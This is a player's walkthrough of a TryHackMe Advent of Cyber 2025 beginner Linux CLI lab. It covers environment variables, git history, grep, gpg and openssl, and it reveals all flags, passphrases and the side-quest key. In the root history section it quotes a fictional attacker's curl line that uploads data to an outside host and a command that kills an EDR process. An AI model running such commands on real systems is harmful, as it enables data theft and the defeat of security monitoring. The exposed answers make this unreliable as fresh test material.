# Advent of Cyber 2025 - Day 1 - Linux CLI: Shells Bells

## 1. Introduction

The unthinkable has happened - McSkidy has been kidnapped. Without her, Wareville’s defenses are faltering, and Christmas itself hangs by a thread. But panic will not save the season. A long road lies ahead to uncover what truly happened. The TBFC (The Best Festival Company) team already brainstorms what to do next, and their first lead points to the tbfc-web01, a Linux server processing Christmas wishlists. Somewhere within its data may lie the truth: traces of McSkidy’s final actions, or perhaps clues to King Malhare’s twisted vision for EASTMAS.
<br></br>

### Learning Objectives

---

- Learn the basics of the Linux command-line interface (CLI)
- Explore its use for personal objectives and IT administration
- Apply your knowledge to unveil the Christmas mysteries  
  <br></br>

### Connecting to the Machine

---

Start the lab by clicking the Start Machine button. The machine will start in split view and will take around two minutes to load. If the machine is not visible, click the Show Split View button at the top. Once loaded, the terminal window is your Linux CLI, and you will type commands there.

You may also connect using your own THM VPN-connected machine:

```
Username: mcskidy
Password: AoC2025!
IP address: MACHINE_IP
Connection: SSH
ssh mcskidy@MACHINE_IP
```

<br></br>

## 2. Linux CLI

### VPN Connection

---

First, we connected to TryHackMe's VPN using OpenVPN:

- Downloaded `.ovpn` config from https://tryhackme.com/access

- Connected via OpenVPN GUI (Run as Administrator)

- Verified connection with assigned internal IP: `192.168.150.142`
  <br></br>

### SSH into Target

---

```bash

ssh mcskidy@10.49.143.22

# Password: AoC2025!

```

**Result:** Successfully logged into Ubuntu 24.04.3 LTS server `tbfc-web01`
<br></br>

### Discovery of Hidden Guide

---

We found a hidden guide file containing initial clues:

```bash

mcskidy@tbfc-web01:~/Guides$ cat .guide.txt

```

**Output:**

```

I think King Malhare from HopSec Island is preparing for an attack.

Not sure what his goal is, but Eggsploits on our servers are not good.

Be ready to protect Christmas by following this Linux guide:


Check /var/log/ and grep inside, let the logs become your guide.

Look for eggs that want to hide, check their shells for what's inside!


P.S. Great job finding the guide. Your flag is:

-----------------------------------------------

THM{learning-linux-cli}

-----------------------------------------------

```

<br></br>

### Discovery of Attack Script

---

We found Sir Carrotbane's malicious script:

```bash

cat /home/socmas/2025/eggstrike.sh

```

**Output:**

```bash

# Eggstrike v0.3

# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"


# Your flag is:

# THM{sir-carrotbane-attacks}

```

**Analysis:** This script:

1. Exports the wishlist to `/tmp/dump.txt`

2. Deletes the original Christmas wishlist

3. Replaces it with an Easter-themed version

4. This causes the website to "glitch" between holidays
   <br></br>

### Root History Analysis

---

Escalated to root and examined command history:

```bash

sudo su

cat /root/.bash_history

```

**Key Findings:**

```bash

curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload    # Data exfiltration!

curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm  # Another flag

pkill tbfcedr                                                   # Killed EDR process

```

**Flag Discovered:** `THM{until-we-meet-again}`
<br></br>

### Answers Found

---

- Directory listing command: `ls`
- Flag in McSkidy’s guide: `THM{learning-linux-cli}`
- Log filtering command: `grep`
- Flag in eggstrike.sh: `THM{sir-carrotbane-attacks}`
- Root switching command: `sudo su`
- Flag in root bash history: `THM{until-we-meet-again}`
  <br></br>

## McSkidy's Secret Note

### Discovery of Instructions

---

Found McSkidy's hidden instructions:

```bash

cat /home/mcskidy/Documents/read-me-please.txt

```

**Content:**

```

From: mcskidy

To: whoever finds this


I've managed to plant a few clues around the account.

If you can get into the user below and look carefully,

those three little "easter eggs" will combine into a passcode

that unlocks a further message that I encrypted in the

/home/eddi_knapp/Documents/ directory.


Access the user account:

username: eddi_knapp

password: S0mething1Sc0ming


There are three hidden easter eggs.

They combine to form the passcode to open my encrypted vault.


Clues (one for each egg):


1) I ride with your session, not with your chest of files.

	Open the little bag your shell carries when you arrive.


2) The tree shows today; the rings remember yesterday.

	Read the ledger's older pages.


3) When pixels sleep, their tails sometimes whisper plain words.

	Listen to the tail.

```

<br></br>

### Switch to Target User

---

```bash

su eddi_knapp

# Password: S0mething1Sc0ming

```

<br></br>

### Fragment #1 - Environment Variables

---

**Clue:** _"I ride with your session... Open the little bag your shell carries when you arrive."_

**Interpretation:** Environment variables are loaded into memory when a shell session starts. They "ride with your session."

**Command:**

```bash

printenv | grep PASSFRAG

```

**Output:**

```

PASSFRAG1=3ast3r

```

**Fragment 1:** `3ast3r`

<br></br>

### Fragment #2 - Git History Forensics

---

**Clue:** _"The tree shows today; the rings remember yesterday. Read the ledger's older pages."_

**Interpretation:** "Tree rings" = version history. "Ledger" = Git commit log. The fragment was in a **deleted commit**.

**Hidden Git Repository:**

```bash

cd ~/.secret_git/.git

cat logs/HEAD

```

**Git Log Output:**

```

0000000... b65ff21... commit (initial): add private note

b65ff21... 98f546c... commit: remove sensitive note    # <-- DELETED!

```

**Recovery Command:**

```bash

git show d12875c8b62e089320880b9b7e41d6765818af3d

```

**Output:**

```diff

+========================================

+Private note from McSkidy

+========================================

+We hid things to buy time.

+PASSFRAG2: -1s-

```

**Fragment 2:** `-1s-`
<br></br>

### Fragment #3 - Hidden File Discovery

---

**Clue:** _"When pixels sleep, their tails sometimes whisper plain words. Listen to the tail."_

**The Solution - Recursive Grep:**

Instead of trusting the misleading hints, we searched ALL files:

```bash

grep -r "PASSFRAG" ~/ 2>/dev/null

```

**Critical Discovery:**

```

/home/eddi_knapp/Pictures/.easter_egg:PASSFRAG3: c0M1nG

```

There was a **hidden file** named `.easter_egg` in the Pictures directory - not inside the PNG!

**Fragment 3:** `c0M1nG`
<br></br>

### Combine Fragments

---

| Fragment | Value    | Source                    |
| -------- | -------- | ------------------------- |
| 1        | `3ast3r` | Environment variable      |
| 2        | `-1s-`   | Deleted Git commit        |
| 3        | `c0M1nG` | Hidden `.easter_egg` file |

**Master Password:** `3ast3r-1s-c0M1nG`
<br></br>

### Decrypt GPG File

---

```bash

cd ~/Documents

gpg --batch --passphrase "3ast3r-1s-c0M1nG" -d mcskidy_note.txt.gpg

```

**Decrypted Message:**

```

Congrats — you found all fragments and reached this file.


Below is the list that should be live on the site. If you replace the contents of

/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),

the site will recognise it and the takeover glitching will stop.


Hardware security keys (YubiKey or similar)

Commercial password manager subscriptions (team seats)

Endpoint detection & response (EDR) licenses

Secure remote access appliances (jump boxes)

Cloud workload scanning credits (container/image scanning)

Threat intelligence feed subscription

When the wishlist is corrected, the site will show a block of ciphertext.

UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z


A final note — I don't know exactly where they have me, but there are *lots* of eggs

and I can smell chocolate in the air. Something big is coming.  — McSkidy

```

<br></br>

### Fix the Corrupted Wishlist

---

```bash

cat > /home/socmas/2025/wishlist.txt <<EOF

```

<br></br>

### Retrieve Ciphertext from API

---

The website backend exposed an API endpoint with the secret ciphertext:

```bash

curl http://localhost:8081/secret

```

**Response:**

```json
{
  "ok": true,

  "text": "U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c="
}
```

<br></br>

### Decrypt the Ciphertext

---

```bash

echo 'U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sU...' > /tmp/cipher.txt


openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 \

  -in /tmp/cipher.txt \

  -out /tmp/decoded.txt \

  -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'


cat /tmp/decoded.txt

```

**Decrypted Output:**

```

Well done — the glitch is fixed. Amazing job going the extra mile and saving the site.

Take this flag THM{w3lcome_2_A0c_2025}


NEXT STEP:

If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:

/home/eddi_knapp/.secret/dir


That hidden directory has been archived and encrypted with the FLAG.

Inside it you'll find the sidequest key.

```

**Flag:** `THM{w3lcome_2_A0c_2025}`
<br></br>

### Locate the Encrypted Archive

---

```bash

cd ~/.secret

ls -la

```

**Output:**

```

-rw-------  1 eddi_knapp eddi_knapp 419589 Dec  1 08:32 dir.tar.gz.gpg

```

<br></br>

### Decrypt and Extract

---

```bash

gpg --batch --passphrase "THM{w3lcome_2_A0c_2025}" -d dir.tar.gz.gpg | tar -xzv

```

**Output:**

```

gpg: AES256.CFB encrypted data

gpg: encrypted with 1 passphrase

dir/

dir/sq1.png

```

<br></br>

### Transfer to Local Machine

---

We transferred the file:

**On Linux (prepare file):**

```bash

cp sq1.png /tmp/final_flag.png

chmod 644 /tmp/final_flag.png

```

**On Windows (download):**

```powershell

scp mcskidy@10.49.143.22:/tmp/final_flag.png .

```

<br></br>

### The Final Flag

---

Opening `final_flag.png` revealed an image of an Easter egg with the Side Quest Key written on it:

**SIDE QUEST KEY:** `now_you_see_me`
<br></br>
